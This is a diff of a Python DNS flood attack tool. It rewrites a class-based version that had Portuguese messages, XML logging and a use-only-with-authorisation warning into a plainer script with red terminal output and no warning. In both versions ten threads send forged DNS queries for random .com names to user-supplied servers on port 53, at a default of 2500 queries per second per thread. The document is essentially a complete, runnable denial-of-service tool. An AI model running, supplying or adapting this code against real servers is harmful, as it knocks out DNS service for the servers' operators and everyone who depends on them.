@@ -10,194 +10,146 @@ import time
 import os
 import signal
 import sys
-from datetime import datetime
 
-# Global flag to handle graceful termination
-running = True
+RED = "\033[38;2;255;0;0m"
+RESET = "\033[0m"
+BOLD = "\033[1m"
 
-def dict_to_xml(tag, d):
-    """Converts a dictionary to a simple XML string."""
-    parts = [f"<{tag}>"]
-    for key, value in d.items():
-        if isinstance(value, dict):
-            parts.append(dict_to_xml(key, value))
-        else:
-            parts.append(f"<{key}>{value}</{key}>")
-    parts.append(f"</{tag}>")
-    return ''.join(parts)
+# Global variables
+dnsServers = []
+attackDuration = 0
+queryRate = 0
+dnsThreads = 10 
+dnsRunning = False
+startTime = None
+packetsSent = 0
+stopTimer = False
+stdoutLock = threading.Lock()
+timerThread = None
 
-class DNSFlooder:
-    def __init__(self, dns_servers, duration, query_rate):
-        """Initialize the DNS flooder with the target configuration."""
-        self.dns_servers = dns_servers
-        self.attack_duration = duration
-        self.query_rate = query_rate
-        self.threads = 10  # Number of threads for sending DNS queries
-        self.running = False
-        self.start_time = None
-        self.log_dir = "/var/log/network_tests"
-        os.makedirs(self.log_dir, exist_ok=True)
-        self.log_file = os.path.join(self.log_dir, f"dns_flood_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml")
-        self.stats = {
-            'dns_queries_sent': 0,
-            'errors': 0,
-            'start_time': None,
-            'end_time': None
-        }
+def UpdateTimer(startTime):
+    global stopTimer, packetsSent
+    while not stopTimer:
+        elapsed = time.time() - startTime
+        elapsedFormatted = time.strftime("%H:%M:%S", time.gmtime(elapsed))
+        with stdoutLock:
+            sys.stdout.write(f"\rPackets Sent: {BOLD}{packetsSent}{RESET} | Duration: {BOLD}{elapsedFormatted}{RESET}")
+            sys.stdout.flush()
+        time.sleep(1)
+    # Clean up the progress line once done
+    with stdoutLock:
+        sys.stdout.write("\n")
+        sys.stdout.flush()
 
-    def _log_event(self, event_type, message):
-        log_entry = {
-            'timestamp': datetime.now().isoformat(),
-            'type': event_type,
-            'message': message,
-            'stats': self.stats.copy()
-        }
+def GenerateRandomDomain():
+    letters = "abcdefghijklmnopqrstuvwxyz"
+    domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
+    return domain + ".com"
+
+def CreateDnsQuery(domain):
+    transactionId = random.randint(0, 65535)
+    flags = struct.pack(">H", 0x0100)  # standard query with recursion desired
+    numQueries = struct.pack(">H", 1)
+    numAnswers = struct.pack(">H", 0)
+    numAuthority = struct.pack(">H", 0)
+    numAdditional = struct.pack(">H", 0)
+    encodedDomain = b""
+    for label in domain.split("."):
+        encodedDomain += struct.pack(">B", len(label)) + label.encode()
+    encodedDomain += b"\x00"
+    queryType = struct.pack(">H", 1)  # A record
+    queryClass = struct.pack(">H", 1)  # IN class
+    return (struct.pack(">H", transactionId) + flags + numQueries +
+            numAnswers + numAuthority + numAdditional +
+            encodedDomain + queryType + queryClass)
+
+def SendDnsQueries():
+    global dnsRunning, packetsSent
+    endTime = time.time() + attackDuration
+    while dnsRunning and time.time() < endTime:
         try:
-            with open(self.log_file, 'a') as f:
-                xml_entry = dict_to_xml('log', log_entry)
-                f.write(xml_entry + '\n')
+            targetIp = random.choice(dnsServers)
+            domain = GenerateRandomDomain()
+            query = CreateDnsQuery(domain)
+            isIpv6 = ":" in targetIp
+            sockType = socket.AF_INET6 if isIpv6 else socket.AF_INET
+            sock = socket.socket(sockType, socket.SOCK_DGRAM)
+            sock.sendto(query, (targetIp, 53))
+            sock.close()
+            packetsSent += 1
+            time.sleep(1 / queryRate)
         except Exception as e:
-            print(f"[LOG ERROR] {str(e)}")
+            print(f"Error: {str(e)}")
+            time.sleep(0.001)
 
-    def generate_random_domain(self):
-        """Generates a random domain name for the attack."""
-        letters = "abcdefghijklmnopqrstuvwxyz"
-        domain = "".join(random.choice(letters) for _ in range(random.randint(5, 10)))
-        return domain + ".com"
+def DnsFlood():
+    threads = []
+    for _ in range(dnsThreads):
+        t = threading.Thread(target=SendDnsQueries)
+        t.daemon = True
+        t.start()
+        threads.append(t)
+    for t in threads:
+        t.join()
 
-    def create_dns_query(self, domain):
-        """Creates a DNS query packet for a given domain."""
-        transaction_id = random.randint(0, 65535)
-        flags = struct.pack(">H", 0x0100)  # Standard query with recursion desired
-        num_queries = struct.pack(">H", 1)
-        num_answers = struct.pack(">H", 0)
-        num_authority = struct.pack(">H", 0)
-        num_additional = struct.pack(">H", 0)
+def Start():
+    global dnsRunning, startTime, stopTimer, timerThread, packetsSent
+    print(f"\n{RED}Attack Configuration:{RESET}")
+    print(f"{RED}- DNS Servers: {RESET}{BOLD}{', '.join(dnsServers)}{RESET}")
+    print(f"{RED}- Duration: {RESET}{BOLD}{attackDuration}s{RESET}")
+    print(f"{RED}- Packets: {RESET}{BOLD}{queryRate * dnsThreads} per second\n{RESET}")
+    print(f"{RED}Starting DNS flood attack...{RESET}\n")
+    dnsRunning = True
+    packetsSent = 0
+    startTime = time.time()
+    stopTimer = False
+    # Start the timer thread
+    timerThread = threading.Thread(target=UpdateTimer, args=(startTime,))
+    timerThread.start()
+    try:
+        DnsFlood()
+    except KeyboardInterrupt:
+        print("\nInterrupted by user!")
+    Stop()
 
-        # Encode domain name into DNS format
-        encoded_domain = b""
-        for label in domain.split("."):
-            encoded_domain += struct.pack(">B", len(label)) + label.encode()
-        encoded_domain += b"\x00"
+def Stop():
+    global dnsRunning, stopTimer, timerThread
+    dnsRunning = False
+    stopTimer = True
+    if timerThread is not None and timerThread.is_alive():
+        timerThread.join()
+    print(f"\n{RED}Stopping the attack...{RESET}")
 
-        query_type = struct.pack(">H", 1)  # A record
-        query_class = struct.pack(">H", 1)  # IN class
-
-        return (struct.pack(">H", transaction_id) + flags + num_queries +
-                num_answers + num_authority + num_additional +
-                encoded_domain + query_type + query_class)
-
-    def send_dns_queries(self):
-        """Sends DNS queries to the target DNS servers."""
-        end_time = time.time() + self.attack_duration
-        while self.running and time.time() < end_time:
-            try:
-                target_ip = random.choice(self.dns_servers)
-                domain = self.generate_random_domain()
-                query = self.create_dns_query(domain)
-
-                # Determine if target_ip is IPv6 or IPv4
-                is_ipv6 = ":" in target_ip
-                sock_type = socket.AF_INET6 if is_ipv6 else socket.AF_INET
-
-                sock = socket.socket(sock_type, socket.SOCK_DGRAM)
-                sock.sendto(query, (target_ip, 53))
-                sock.close()
-
-                self.stats['dns_queries_sent'] += 1
-                time.sleep(1 / self.query_rate)
-            except Exception as e:
-                self.stats['errors'] += 1
-                self._log_event('DNS_ERROR', str(e))
-                time.sleep(0.001)
-
-    def dns_flood(self):
-        """Start the DNS flood attack using multiple threads."""
-        self._log_event('DNS_START', 'Iniciando ataque de DNS flood')
-        threads = []
-        for _ in range(self.threads):
-            t = threading.Thread(target=self.send_dns_queries)
-            t.daemon = True
-            t.start()
-            threads.append(t)
-
-        for t in threads:
-            t.join()
-
-    def start(self):
-        """Starts the attack."""
-        self.running = True
-        self.stats['start_time'] = datetime.now().isoformat()
-        self.start_time = time.time()
-
-        print(f"\n🔧 Configuração do Ataque:")
-        print(f"   • DNS Servers: {', '.join(self.dns_servers)}")
-        print(f"   • Duração: {self.attack_duration}s")
-        print(f"   • Query Rate: {self.query_rate} qps por thread")
-        print(f"   • Log File: {self.log_file}\n")
-
-        try:
-            self.dns_flood()
-        except KeyboardInterrupt:
-            print("\n🛑 Interrompido pelo usuário!")
-
-        self.stop()
-
-    def stop(self):
-        """Stop the attack."""
-        self.running = False
-        self.stats['end_time'] = datetime.now().isoformat()
-        self._log_event('TEST_END', 'Ataque de DNS flood concluído')
-
-        duration = time.time() - self.start_time
-        print("\n\n📊 Relatório Final:")
-        print(f"   • Duração real: {duration:.1f}s")
-        print(f"   • DNS Queries enviadas: {self.stats['dns_queries_sent']}")
-        print(f"   • Erros registrados: {self.stats['errors']}")
-        print(f"   • Log completo em: {self.log_file}\n")
-
-def signal_handler(sig, frame):
-    """Graceful exit handler."""
-    global running
-    print("\n🛑 Recebido sinal de interrupção!")
-    running = False
+def SignalHandler(sig, frame):
+    
+    Stop()
     sys.exit(0)
 
-def menu():
-    """Interactive menu mode."""
-    print("\n⚠️ AVISO LEGAL: Use este script apenas em redes próprias ou com autorização explícita!\n")
-    dns_servers = input("Digite os endereços IP dos servidores DNS (separados por vírgula): ").split(",")
-    duration = int(input("Digite a duração do ataque em segundos: "))
-    query_rate = int(input("Digite a taxa de consultas por segundo por thread: "))
+def Menu():
+    global dnsServers, attackDuration, queryRate
+    dnsServers = input(f"\n{RED}Enter the DNS server IP addresses (comma-separated): {RESET}").split(",")
+    attackDuration = int(input(f"{RED}Enter the attack duration in seconds: {RESET}"))
+    queryRate = int(input(f"{RED}Enter the query rate (it will be multiplied by 10): {RESET}"))
+    Start()
 
-    # Create and start the DNS flooder
-    flooder = DNSFlooder(dns_servers, duration, query_rate)
-    flooder.start()
-
-def terminal():
-    """Terminal mode using arguments."""
+def Terminal():
     parser = argparse.ArgumentParser(description="DNS Flood Attack Tool")
     parser.add_argument("-d", "--dns", type=str, required=True, help="Comma-separated list of DNS server IP addresses.")
     parser.add_argument("-t", "--duration", type=int, default=120, help="Attack duration in seconds (default: 120).")
     parser.add_argument("-q", "--query_rate", type=int, default=2500, help="Queries per second per thread (default: 2500).")
-
     args = parser.parse_args()
+    global dnsServers, attackDuration, queryRate
+    dnsServers = args.dns.split(",")
+    attackDuration = args.duration
+    queryRate = args.query_rate
+    Start()
 
-    dns_servers = args.dns.split(",")
-    duration = args.duration
-    query_rate = args.query_rate
-
-    flooder = DNSFlooder(dns_servers, duration, query_rate)
-    flooder.start()
-
-def main():
-    """Main function to handle both interactive and terminal modes."""
-    signal.signal(signal.SIGINT, signal_handler)
-
+def Main():
+    signal.signal(signal.SIGINT, SignalHandler)
     if len(sys.argv) > 1:
-        terminal()  # Terminal mode
+        Terminal()
     else:
-        menu()  # Interactive menu mode
+        Menu()
 
 if __name__ == "__main__":
-    main()
+    Main()
